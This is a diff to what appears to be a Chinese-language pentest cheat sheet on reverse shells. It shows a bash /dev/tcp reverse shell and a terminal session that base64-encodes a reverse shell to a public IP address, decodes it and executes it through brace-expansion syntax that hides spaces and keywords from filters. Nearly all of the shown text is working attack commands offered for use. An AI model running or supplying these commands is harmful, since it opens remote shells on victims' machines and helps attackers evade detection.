@@ -27,6 +27,16 @@ topics = ["Pentest"]
 ```
 bash -i >& /dev/tcp/10.10.10.10/8888 0>&1
 注：这个由解析shell的bash完成，有些时候不支持
+
+reber@wyb:~$ cat tmp.txt 
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzExNC4xMTUuMTgzLjg2LzY2NjYgMD4mMQ==
+reber@wyb:~$ cat tmp.txt |base64 -d
+/bin/bash -i >& /dev/tcp/114.115.183.86/6666 0>&1
+reber@wyb:~$ 
+reber@wyb:~$ {cat,tmp.txt}|{base64,-d}|{bash,-i}
+reber@wyb:~$ /bin/bash -i >& /dev/tcp/114.115.183.86/6666 0>&1
+reber@wyb:~$ exit
+reber@wyb:~$ 
 ```
 
 ### 0x03 crontab
